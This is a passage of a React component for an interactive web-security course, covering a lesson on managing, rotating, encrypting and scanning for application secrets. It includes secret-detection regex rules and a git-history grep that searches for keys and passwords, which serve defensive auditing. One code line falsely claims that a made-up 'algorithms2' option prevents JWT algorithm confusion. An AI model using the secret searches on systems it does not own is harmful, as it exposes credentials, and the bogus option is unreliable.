  - Keys automatically expire and rotate.
  - If a key card is lost: revoke instantly, issue new one.

LEAST PRIVILEGE:
  The teller needs the cash drawer key.
  They do NOT need the manager's safe key.
  They do NOT need the server room key.
  Give each process only the secrets it needs for its job.

KEY ROTATION:
  Even if a locksmith copied the vault key yesterday,
  today you change all the locks.
  The copied key is now useless.
  Automatic rotation: locks change on schedule without human action.

AUDIT LOG:
  Every time someone opens any vault: recorded.
  Reviewer can see: "key X was accessed 47 times on Tuesday — unusual."
  Forensics: after an incident, reconstruct exactly what was accessed.`,

    deep: `SECRETS HIERARCHY:

TIER 1 — MOST SENSITIVE (never in env vars, always in vault):
  Database master passwords
  Root CA private keys
  Encryption keys for user data
  Payment gateway merchant keys
  OAuth client secrets
  
TIER 2 — SENSITIVE (env vars in CI/CD with vault at runtime):
  JWT signing secrets
  Session encryption keys
  Internal API keys between your own services
  Third-party API keys with billing impact

TIER 3 — CONFIGURATION (env vars acceptable):
  Feature flags
  Timeouts, limits, URLs
  Log levels
  Non-sensitive service URLs

SECRET ROTATION STRATEGIES:

MANUAL ROTATION (avoid for critical secrets):
  Engineer rotates periodically by hand.
  Risk: forgotten, inconsistent, no audit trail.

AUTOMATED ROTATION with zero downtime:
  App supports multiple valid keys simultaneously (dual-write period).
  Vault issues new key. App adds new key to key store.
  Old key removed after all sessions using it expire.
  Requires your code to handle multiple valid keys.

DYNAMIC SECRETS (most advanced):
  Vault generates a unique DB credential PER application instance.
  Credential valid for only the lifetime of that instance.
  When app crashes: credential is automatically revoked.
  Attacker who steals credentials has them for minutes, not months.

DETECTING SECRET EXPOSURE:
  GitHub: Secret scanning partner program — GitHub alerts you.
  TruffleHog: scans git history for secrets (even after deletion from HEAD).
  GitLeaks: pre-commit hook to prevent committing secrets.
  "git log -p | grep -E '(API_KEY|SECRET|PASSWORD)'" — manual audit.

PRACTICAL RULES:
  1. Never commit .env files (add .env to .gitignore globally).
  2. Never log secrets — redact in logger.
  3. Never put secrets in error messages.
  4. Never put secrets in URLs (they appear in logs, browser history, Referer header).
  5. Never put secrets in client-side code.
  6. Rotate all secrets that may have been exposed — immediately.`,

    code: `// SECURE SECRETS LOADING ──────────────────────────────

class SecretsManager {
  constructor(config) {
    this.config    = config;
    this.cache     = new Map();
    this.rotatable = new Map(); // secrets that support multiple valid values
  }

  // Load secrets from environment, validating presence and minimum security requirements
  async loadEnvironmentSecrets() {
    const required = [
      { key: "DATABASE_URL",      validate: (v) => v.startsWith("postgresql://") || v.startsWith("mongodb://") },
      { key: "JWT_SECRET",        validate: (v) => v.length >= 64, reason: "must be at least 64 chars" },
      { key: "REDIS_URL",         validate: (v) => v.startsWith("redis://") || v.startsWith("rediss://") },
      { key: "ENCRYPTION_KEY",    validate: (v) => Buffer.from(v, "hex").length === 32, reason: "must be 32 bytes hex" }
    ];

    const errors = [];
    for (const { key, validate, reason } of required) {
      const value = process.env[key];
      if (!value) {
        errors.push("Missing required secret: " + key);
        continue;
      }
      if (validate && !validate(value)) {
        errors.push("Invalid secret " + key + (reason ? ": " + reason : ""));
      }
    }

    if (errors.length > 0) {
      // Fatal — do not start with invalid secrets
      console.error("Secret validation failed:\\n" + errors.join("\\n"));
      process.exit(1);
    }

    return {
      databaseUrl:   process.env.DATABASE_URL,
      jwtSecret:     process.env.JWT_SECRET,
      redisUrl:      process.env.REDIS_URL,
      encryptionKey: Buffer.from(process.env.ENCRYPTION_KEY, "hex")
    };
  }

  // Support for multiple active JWT keys — enables zero-downtime rotation
  addJWTKey(kid, secret, isPrimary = false) {
    if (!this.rotatable.has("jwt")) this.rotatable.set("jwt", new Map());
    const keys = this.rotatable.get("jwt");
    keys.set(kid, { secret, isPrimary, addedAt: Date.now() });
  }

  getJWTKey(kid) {
    return this.rotatable.get("jwt")?.get(kid) || null;
  }

  getPrimaryJWTKey() {
    const keys = this.rotatable.get("jwt");
    if (!keys) return null;
    for (const [kid, key] of keys) {
      if (key.isPrimary) return { kid, ...key };
    }
    return null;
  }

  // Remove old keys after rotation (with delay for in-flight tokens)
  async removeJWTKey(kid, delayMs = 86400000) { // 24h delay
    setTimeout(() => {
      const keys = this.rotatable.get("jwt");
      if (keys) {
        keys.delete(kid);
        logger.info("jwt_key_removed", { kid });
      }
    }, delayMs);
  }
}


// JWT WITH KEY ROTATION ───────────────────────────────

class RotatableTokenService {
  constructor(secretsManager) {
    this.secrets = secretsManager;
  }

  sign(payload) {
    const primaryKey = this.secrets.getPrimaryJWTKey();
    if (!primaryKey) throw new Error("No primary JWT key configured");

    // Include kid (key ID) in token header — used to verify with correct key
    return jwt.sign(payload, primaryKey.secret, {
      algorithm: "HS256",
      expiresIn: "15m",
      keyid:     primaryKey.kid  // goes into JWT header.kid
    });
  }

  verify(token) {
    // Decode header to get kid (without verifying)
    const decoded = jwt.decode(token, { complete: true });
    if (!decoded) throw new Error("Invalid token");

    const kid = decoded.header.kid;
    if (!kid) throw new Error("Token missing kid");

    const key = this.secrets.getJWTKey(kid);
    if (!key) throw new Error("Unknown key ID: " + kid); // old key removed or invalid kid

    return jwt.verify(token, key.secret, {
      algorithms:  ["HS256"],
      algorithms2: undefined // prevent algorithm confusion
    });
  }
}

// Zero-downtime key rotation:
// 1. Generate new key
// 2. Add as primary (new tokens use new key, old tokens still verify with old key)
// 3. Wait for old tokens to expire (15 min)
// 4. Remove old key


// ENCRYPTION OF SENSITIVE DATA AT REST ────────────────

const { createCipheriv, createDecipheriv, randomBytes } = require("crypto");

class EncryptionService {
  constructor(key) {
    if (key.length !== 32) throw new Error("Encryption key must be 32 bytes");
    this.key       = key;
    this.algorithm = "aes-256-gcm"; // authenticated encryption — detects tampering
  }

  encrypt(plaintext) {
    const iv         = randomBytes(12); // 96-bit IV for GCM
    const cipher     = createCipheriv(this.algorithm, this.key, iv);
    const encrypted  = Buffer.concat([cipher.update(String(plaintext), "utf8"), cipher.final()]);
    const authTag    = cipher.getAuthTag(); // 128-bit authentication tag

    // Store IV + authTag + ciphertext together
    return Buffer.concat([iv, authTag, encrypted]).toString("base64");
  }

  decrypt(encryptedBase64) {
    const data      = Buffer.from(encryptedBase64, "base64");
    const iv        = data.slice(0, 12);
    const authTag   = data.slice(12, 28);
    const encrypted = data.slice(28);

    const decipher  = createDecipheriv(this.algorithm, this.key, iv);
    decipher.setAuthTag(authTag); // will throw if data was tampered

    return Buffer.concat([decipher.update(encrypted), decipher.final()]).toString("utf8");
    // Throws on tampered/corrupted data — do not ignore this error
  }
}

// Usage: encrypt PII before storing in DB
class UserRepository {
  async create(data) {
    return UserModel.create({
      name:          data.name,
      email:         data.email,
      // Encrypt PII — even if DB is breached, data is useless without the key
      encryptedPhone: encryption.encrypt(data.phone),
      encryptedSSN:   data.ssn ? encryption.encrypt(data.ssn) : null
    });
  }

  async findById(id) {
    const user = await UserModel.findById(id).lean();
    if (!user) return null;
    return {
      ...user,
      phone: user.encryptedPhone ? encryption.decrypt(user.encryptedPhone) : null,
      ssn:   user.encryptedSSN   ? encryption.decrypt(user.encryptedSSN)   : null
    };
  }
}


// SECRET SCANNING — detect before commit ──────────────

// .gitleaks.toml (run with: gitleaks detect --source . -v)
/*
title = "gitleaks config"

[[rules]]
description = "Generic API Key"
regex = '''(?i)(api[_-]?key|apikey|api[_-]?secret)\s*[=:]\s*['"]?([A-Za-z0-9_\-]{20,})['"]?'''
entropy = 3.5

[[rules]]
description = "JWT Secret"
regex = '''(?i)(jwt[_-]?secret|jwt[_-]?key)\s*[=:]\s*['"]?([A-Za-z0-9_\-]{20,})['"]?'''

[[rules]]
description = "AWS Access Key"
regex = '''AKIA[0-9A-Z]{16}'''

[[rules]]
description = "Database URL with password"
regex = '''(postgresql|mongodb|mysql|redis):\/\/[^:]+:[^@]+@'''

[allowlist]
  paths = ["test/fixtures/*", "*.example", ".env.example"]
  regexes = ["EXAMPLE_KEY", "YOUR_API_KEY_HERE", "placeholder"]
*/


// ENVIRONMENT VARIABLE BEST PRACTICES ─────────────────

// WRONG — common in tutorials, never in production code
const config = {
  jwtSecret:   "mysupersecretkey",  // hardcoded — in git forever
  dbPassword:  "password123",       // will be in git history even if later removed
  stripeKey:   "sk_live_hardcoded"  // costs real money if leaked
};

// WRONG — env var but loaded too late (logs might capture the value)
console.log("Starting server with DB:", process.env.DATABASE_URL);

// RIGHT — validate at startup, log only what is safe
async function loadConfig() {
  const secrets = await secretsManager.loadEnvironmentSecrets();
  logger.info("config_loaded", {
    dbConnected:   !!secrets.databaseUrl,  // log presence, NOT value
    jwtKeyCount:   secretsManager.rotatable.get("jwt")?.size || 0,
    environment:   process.env.NODE_ENV
  });
  return secrets;
}`,

    bugs: `// BUG 1: Secrets in log output

async function connectDB() {
  const url = process.env.DATABASE_URL;
  logger.info("connecting to database: " + url);
  // Log: "connecting to database: postgresql://admin:SuperSecret@db.example.com/prod"
  // Password now in: CloudWatch Logs, Datadog, log files, log aggregators
  // Anyone with log access has your DB password
}

async function connectDBSafe() {
  const url    = new URL(process.env.DATABASE_URL);
  const safeUrl = url.protocol + "//" + url.hostname + ":" + url.port + url.pathname;
  logger.info("connecting_to_db", { host: url.hostname, database: url.pathname.slice(1) });
  // Logs: host and database name — no password
}


// BUG 2: Secrets in error messages returned to clients

app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message
    // "Invalid credentials for DB postgresql://admin:SuperSecret@..."
    // "Invalid JWT secret: 'weakpassword'"
    // "SMTP authentication failed for user admin@company.com with password 'emailpass'"
  });
});

app.use((err, req, res, next) => {
  // Log the real error internally with the secret details
  logger.error("server_error", {
    requestId: req.requestId,
    error:     err.message,  // full error in logs (internal only)
    stack:     err.stack
  });
  // Send a safe message to the client
  res.status(500).json({
    success: false,
    error: {
      code:      "INTERNAL_ERROR",
      message:   "An unexpected error occurred",
      requestId: req.requestId // they can give this to support
    }
  });
});


// BUG 3: Secret in URL (appears in logs, Referer, browser history)

// WRONG: API key in URL query parameter
const response = await fetch(
  "https://api.partner.com/v1/data?api_key=" + process.env.PARTNER_API_KEY
);
// This key appears in:
// - Your server's access logs: GET /v1/data?api_key=sk_live_...
// - Nginx access.log
// - Any HTTP proxy logs
// - If redirected: the Referer header the next site receives
// - Browser history (if called from frontend)

// RIGHT: secret in Authorization header (not logged by default)
const response2 = await fetch("https://api.partner.com/v1/data", {
  headers: { "Authorization": "Bearer " + process.env.PARTNER_API_KEY }
});
// Headers are not logged in server access logs.
// Not in Referer. Not in browser history. Not in redirects.`,

    challenge: `// CHALLENGE: Build a production secrets management system.

// Part 1: SecureConfig class
//   load(): validates all required secrets at startup.
//   Fails fast (process.exit(1)) if any required secret:
//     - Is missing
//     - Fails the format validator
//     - Fails the entropy check (for secrets that should be random)
//   Required secrets and their validators:
//     DATABASE_URL: starts with postgresql:// or mongodb://, contains no hardcoded test passwords
//     JWT_SECRET: at least 64 chars, entropy > 3.5 bits/char
//     ENCRYPTION_KEY: exactly 64 hex chars (32 bytes)
//     REDIS_URL: valid Redis URL
//   EntropyCalculator: compute Shannon entropy of a string. Reject if below threshold.

// Part 2: RotatableEncryptionService
//   Supports multiple encryption keys (for key rotation without decryption failure).
//   Keys have: id, key bytes, createdAt, isPrimary boolean.
//   encrypt(plaintext): uses primary key, prefixes output with "keyId:encryptedData"
//   decrypt(ciphertext): reads keyId prefix, finds matching key, decrypts.
//   addKey(id, hexKey, isPrimary): add a new key to the key store.
//   rotateKey(newHexKey): set new key as primary, keep old key for 24h for ongoing decrypts.
//   removeKey(id): remove from store (safe only after all data re-encrypted with new key).

// Part 3: SecretAuditor
//   Run as a startup check and also on a schedule (daily).
//   Checks:
//     - No secrets in process.env that appear in logs (scan recent log lines)
//     - All secrets meet minimum entropy requirements
//     - JWT secret has been rotated in the last 90 days
//     - Encryption key has been rotated in the last 180 days
//     - No .env file exists in the deployment directory
//   Outputs: audit report with pass/fail/warning per check.
//   On failure of critical checks: alerts the security Slack channel.

// Part 4: Zero-downtime JWT key rotation
//   Implement the full rotation flow:
//   Step 1: generateNewKey() → creates new kid + secret
//   Step 2: addKey(kid, secret, isPrimary: true) → new tokens use new key
//   Step 3: keepOldKey(oldKid) → old tokens still verifiable for 15 min
//   Step 4: after 20 min: removeOldKey(oldKid) → old key gone
//   Test: tokens issued before rotation still verify during and after rotation.`
  }
];

// ─── COMPONENTS ───────────────────────────────────────────────────────────────

function CodeBlock({ code }) {
  const [copied, setCopied] = useState(false);
  return (
    <div style={{ position: "relative", marginBottom: 0 }}>
      <button
        onClick={() => { navigator.clipboard.writeText(code); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
        style={{
          position: "absolute", top: 10, right: 10, zIndex: 2,
          background: copied ? "#00e5cc11" : "#ffffff06",
          border: "1px solid " + (copied ? "#00e5cc44" : "#1a2640"),
          color: copied ? ACCENT : "#2a3a50",
          padding: "3px 10px", borderRadius: 4,
          fontSize: "9px", cursor: "pointer", letterSpacing: "1.5px",
          fontFamily: "'JetBrains Mono', monospace", textTransform: "uppercase"
        }}
      >{copied ? "COPIED" : "COPY"}</button>
      <pre style={{
        background: "#020812",
        border: "1px solid " + BORDER,
        borderRadius: 10, padding: "20px 18px",
        overflowX: "auto", fontSize: "11px", lineHeight: "1.9",
        color: "#7aa0c0", fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
        margin: 0, whiteSpace: "pre-wrap", wordBreak: "break-word"
      }}><code>{code}</code></pre>
    </div>
  );
}

function Pill({ text, color }) {
  return (
    <span style={{
      fontSize: "8px", letterSpacing: "2px", textTransform: "uppercase",
      color, background: color + "0f", border: "1px solid " + color + "28",
      padding: "2px 8px", borderRadius: 3, fontFamily: "'JetBrains Mono', monospace"
    }}>{text}</span>
  );
}

function SectionLabel({ text, color }) {
  return (
    <div style={{
      display: "flex", alignItems: "center", gap: 8, marginBottom: 12
    }}>
      <span style={{ width: 16, height: 1, background: color + "80", display: "inline-block" }} />
      <span style={{ fontSize: "8px", letterSpacing: "3px", textTransform: "uppercase", color: color + "90" }}>{text}</span>
    </div>
  );
}

const TABS = [
  { key: "why",       label: "WHY IT MATTERS" },
  { key: "analogy",   label: "ANALOGY"         },
  { key: "deep",      label: "DEEP DIVE"       },
  { key: "code",      label: "CODE"            },
  { key: "bugs",      label: "BUGS"            },
  { key: "challenge", label: "CHALLENGE"       },
];

export default function Phase4Guide() {
  const [selected, setSelected]   = useState(null);
  const [completed, setCompleted] = useState({});
  const [tab, setTab]             = useState("why");

  const concept  = selected !== null ? concepts[selected] : null;
  const done     = Object.values(completed).filter(Boolean).length;
  const progress = Math.round((done / concepts.length) * 100);

  const tabContent = concept ? {
    why:       concept.why,
    analogy:   concept.analogy,
    deep:      concept.deep,
    code:      concept.code,
    bugs:      concept.bugs,
    challenge: concept.challenge,
  } : {};

  useEffect(() => {
    if (selected !== null) setTab("why");
  }, [selected]);

  return (
    <div style={{
      minHeight: "100vh", background: BG, color: "#c8d8e8",
      fontFamily: "'JetBrains Mono', monospace", display: "flex", flexDirection: "column"
    }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Bebas+Neue&family=Space+Mono:wght@400;700&display=swap');
        * { box-sizing: border-box; margin: 0; padding: 0; }
        ::-webkit-scrollbar { width: 3px; height: 3px; }
        ::-webkit-scrollbar-thumb { background: #0e1628; border-radius: 2px; }
        .citem:hover { background: rgba(0,229,204,0.04) !important; cursor: pointer; }
        .tbtn { transition: all .15s; }
        .tbtn:hover { opacity: 1 !important; color: #c8d8e8 !important; }
        .navbtn:hover { border-color: #1e3050 !important; color: #6090b0 !important; }
      `}</style>

      {/* ─ HEADER ─ */}
      <div style={{
        padding: "0 26px",
        height: 58,
        borderBottom: "1px solid " + BORDER,
        background: PANEL,
        display: "flex", alignItems: "center",
        justifyContent: "space-between", gap: 16, flexWrap: "wrap"
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <div style={{
            padding: "4px 10px", borderRadius: 4,
            background: ACCENT + "0a", border: "1px solid " + ACCENT + "22",
            fontSize: "8px", letterSpacing: "2.5px", color: ACCENT, textTransform: "uppercase"
          }}>Phase 4 / 5</div>
          <div>
            <div style={{ fontSize: "8px", color: "#1a2a40", letterSpacing: "2.5px", textTransform: "uppercase", marginBottom: 2 }}>
              Networking &amp; Security
            </div>
            <div style={{ fontFamily: "'Bebas Neue', sans-serif", fontSize: "clamp(16px, 2.2vw, 22px)", color: "#e8f0f8", letterSpacing: "1px" }}>
              How the Internet Works → How to Protect It
            </div>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 12, flexWrap: "wrap" }}>
          {concept && (
            <div style={{ display: "flex", gap: 4 }}>
              {[["←", Math.max(0, selected - 1)], ["→", Math.min(concepts.length - 1, selected + 1)]].map(([lbl, idx]) => (
                <button key={lbl} className="navbtn"
                  onClick={() => setSelected(idx)}
                  style={{
                    background: "transparent", border: "1px solid " + BORDER,
                    color: "#2a3a50", padding: "5px 13px", borderRadius: 5,
                    cursor: "pointer", fontSize: "11px", fontFamily: "inherit"
                  }}>{lbl}</button>
              ))}
            </div>
          )}
          <div>
            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 3, fontSize: "8px", letterSpacing: "1px" }}>
              <span style={{ color: "#1a2a40" }}>{done} / {concepts.length}</span>
              <span style={{ color: ACCENT }}>{progress}%</span>
            </div>
            <div style={{ width: 100, height: 2, background: BORDER, borderRadius: 1 }}>
              <div style={{ width: progress + "%", height: "100%", background: ACCENT, transition: "width .4s", borderRadius: 1 }} />
            </div>
          </div>
        </div>
      </div>

      <div style={{ display: "flex", flex: 1, overflow: "hidden", minHeight: "calc(100vh - 58px)" }}>

        {/* ─ SIDEBAR ─ */}
        <div style={{
          width: 228, minWidth: 228, borderRight: "1px solid " + BORDER,
          overflowY: "auto", padding: "12px 8px", background: "#060b14"
        }}>
          {concepts.map((c, i) => (
            <div key={i} className="citem"
              onClick={() => setSelected(i)}
              style={{
                display: "flex", alignItems: "flex-start", gap: 8,
                padding: "9px 10px", borderRadius: 6, marginBottom: 2,
                background: selected === i ? ACCENT + "08" : "transparent",
                border: "1px solid " + (selected === i ? c.color + "22" : "transparent"),
                transition: "all .14s"
              }}>
              <div style={{
                width: 20, height: 20, minWidth: 20, borderRadius: 3,
                border: "1px solid " + (completed[i] ? c.color : "#0e1628"),
                background: completed[i] ? c.color + "14" : "transparent",
                display: "flex", alignItems: "center", justifyContent: "center",
                fontSize: "9px", fontWeight: 700,
                color: completed[i] ? c.color : (selected === i ? "#1a2a40" : "#111824")
              }}>{completed[i] ? "✓" : i + 1}</div>
              <div>
                <div style={{
                  fontSize: "10.5px", lineHeight: "1.35", marginBottom: 4,
                  color: selected === i ? "#c8d8e8" : (completed[i] ? "#1e2e40" : "#4a6070"),
                  textDecoration: completed[i] ? "line-through" : "none",
                  fontWeight: selected === i ? 500 : 400
                }}>{c.title}</div>
                <Pill text={c.tag.split("·")[0].trim()} color={c.color} />
              </div>
            </div>
          ))}
        </div>

        {/* ─ CONTENT ─ */}
        {!concept ? (
          <div style={{
            flex: 1, display: "flex", alignItems: "center", justifyContent: "center",
            flexDirection: "column", gap: 10
          }}>
            <div style={{ fontFamily: "'Bebas Neue', sans-serif", fontSize: 72, color: ACCENT, opacity: .05, letterSpacing: 4 }}>
              NET
            </div>
            <div style={{ fontSize: "9px", letterSpacing: "3px", color: "#0e1628", textTransform: "uppercase" }}>
              Select a concept
            </div>
          </div>
        ) : (
          <div style={{ flex: 1, display: "flex", flexDirection: "column", overflowY: "auto" }}>

            {/* Concept header */}
            <div style={{ padding: "20px 28px 0", background: PANEL, borderBottom: "1px solid " + BORDER }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", gap: 12, marginBottom: 10, flexWrap: "wrap" }}>
                <div>
                  <Pill text={concept.tag} color={concept.color} />
                  <h2 style={{
                    fontFamily: "'Bebas Neue', sans-serif",
                    fontSize: "clamp(20px, 2.5vw, 30px)",
                    color: "#eaf2fc", letterSpacing: "1px",
                    marginTop: 8, lineHeight: 1.15
                  }}>{concept.title}</h2>
                </div>
                <button
                  onClick={() => setCompleted(p => ({ ...p, [selected]: !p[selected] }))}
                  style={{
                    padding: "7px 16px", cursor: "pointer", fontFamily: "inherit",
                    background: completed[selected] ? "transparent" : concept.color + "10",
                    border: "1px solid " + (completed[selected] ? "#0e1628" : concept.color + "30"),
                    borderRadius: 5, fontSize: "8px", letterSpacing: "2px",
                    textTransform: "uppercase", color: completed[selected] ? "#1a2a40" : concept.color,
                    transition: "all .2s", marginTop: 6, whiteSpace: "nowrap"
                  }}>{completed[selected] ? "✓ DONE" : "MARK DONE"}</button>
              </div>

              {/* TLDR */}
              <div style={{
                padding: "11px 14px", marginBottom: 12,
                background: concept.color + "06",
                borderLeft: "2px solid " + concept.color + "40",
                border: "1px solid " + concept.color + "14",
                borderRadius: 7, fontSize: "11.5px", color: "#506070", lineHeight: "1.8"
              }}>
                <span style={{ color: concept.color + "a0", fontSize: "7px", letterSpacing: "2.5px", textTransform: "uppercase", marginRight: 8 }}>TLDR</span>
                {concept.tldr}
              </div>

              {/* Tabs */}
              <div style={{ display: "flex", gap: 0, overflowX: "auto", flexWrap: "nowrap" }}>
                {TABS.map(t => (
                  <button key={t.key} className="tbtn"
                    onClick={() => setTab(t.key)}
                    style={{
                      background: "transparent",
                      border: "none",
                      borderBottom: "2px solid " + (tab === t.key ? concept.color : "transparent"),
                      color: tab === t.key ? concept.color : "#1a2a3a",
                      padding: "8px 14px", fontSize: "8px", letterSpacing: "1.5px",
                      textTransform: "uppercase", cursor: "pointer",
                      fontFamily: "inherit", whiteSpace: "nowrap",
                      opacity: tab === t.key ? 1 : 0.7
                    }}>{t.label}</button>
                ))}
              </div>
            </div>

            {/* Tab content */}
            <div style={{ padding: "24px 28px", flex: 1 }}>

              {tab === "code" || tab === "bugs" ? (
                <div>
                  {tab === "bugs" && (
                    <div style={{
                      padding: "10px 14px", marginBottom: 14, borderRadius: 7,
                      background: "#120609", border: "1px solid #2a1018",
                      fontSize: "9px", color: "#4a1520", lineHeight: "1.7"
                    }}>
                      These bugs have caused real production incidents. Understand the attack, not just the fix.
                    </div>
                  )}
                  <SectionLabel
                    text={tab === "code" ? "Production Code" : "Common Vulnerabilities & Fixes"}
                    color={tab === "bugs" ? "#ff5252" : concept.color}
                  />
                  <CodeBlock code={tabContent[tab]} />
                </div>
              ) : tab === "challenge" ? (
                <div>
                  <div style={{
                    padding: "10px 14px", marginBottom: 14, borderRadius: 7,
                    background: "#110e04", border: "1px solid " + concept.color + "18",
                    fontSize: "9px", color: "#50400e", lineHeight: "1.7"
                  }}>
                    Build from scratch. Only look at the Code tab after a working attempt. Understanding becomes skill through building.
                  </div>
                  <SectionLabel text="Your Challenge" color={concept.color} />
                  <CodeBlock code={tabContent[tab]} />
                </div>
              ) : (
                <div style={{
                  background: "#060c18", border: "1px solid " + BORDER,
                  borderRadius: 10, padding: "22px 24px",
                  fontSize: "11.5px", color: "#4a6080", lineHeight: "2",
                  whiteSpace: "pre-line", fontFamily: "'JetBrains Mono', monospace"
                }}>
                  <SectionLabel
                    text={tab === "why" ? "Why This Matters" : tab === "analogy" ? "Mental Model" : "Under the Hood"}
                    color={concept.color}
                  />
                  {tabContent[tab]}
                </div>
              )}

              {/* Summary footer */}
              <div style={{
                marginTop: 24, padding: "13px 16px",
                background: PANEL, border: "1px solid " + concept.color + "18",
                borderRadius: 8, display: "flex", gap: 10, alignItems: "flex-start"
              }}>
                <span style={{ color: concept.color + "70", fontSize: 10, marginTop: 1 }}>◆</span>
                <div>
                  <div style={{ fontSize: "7px", letterSpacing: "2px", color: concept.color + "60", marginBottom: 4, textTransform: "uppercase" }}>REMEMBER</div>
                  <p style={{ fontSize: "11px", color: "#2a3a50", lineHeight: "1.75", margin: 0 }}>
                    {concept.id === 1  && "Every request: DNS → TCP handshake → TLS → HTTP. Each step adds latency. Use keep-alive, DNS cache, TLS session resumption, and connection pools to amortize these costs."}
                    {concept.id === 2  && "HTTP/2 multiplexing eliminates head-of-line blocking. SSE for server push. WebSocket for bidirectional. Set correct Cache-Control on every endpoint — wrong caching is worse than no caching."}
                    {concept.id === 3  && "TLS provides confidentiality, integrity, and server authentication. Configure: TLS 1.2+ only, strong ciphers, OCSP stapling, HSTS with preload. Test at ssllabs.com. Automate cert renewal."}
                    {concept.id === 4  && "Never concatenate user input into SQL. Parameterize everything. Validate all input. SSRF: never fetch user-supplied URLs without validation. Verbose errors expose your internals."}
                    {concept.id === 5  && "Explicit algorithm in jwt.verify. 32+ byte random secret. 15-minute access tokens. Refresh token rotation with family tracking. Brute force protection on login by IP AND identifier."}
                    {concept.id === 6  && "CORS is browser-only. Wildcard + credentials is rejected and insecure. Reflect only allowlisted origins. Add Vary: Origin when reflecting. CORS does not protect against server-to-server requests."}
                    {concept.id === 7  && "Rate limit at edge, proxy, and application. Token bucket for bursting. Sliding window for accuracy. Validate real IP. Always send Retry-After on 429. Layer limits: per-endpoint, per-user, per-tier."}
                    {concept.id === 8  && "Validate types, format, range at the boundary. Sanitize user-generated HTML. Detect file types from content (magic bytes), not client-declared Content-Type. Prevent prototype pollution."}
                    {concept.id === 9  && "CSP with nonces defeats XSS even when injection succeeds. HSTS prevents SSL stripping. X-Frame-Options blocks clickjacking. Test your headers at securityheaders.com. Apply globally, not per-route."}
                    {concept.id === 10 && "Secrets in code = breach waiting to happen. Validate secrets at startup. Rotate regularly. Never log secrets or put them in URLs. Encrypt PII at rest. Audit for exposure with TruffleHog."}
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}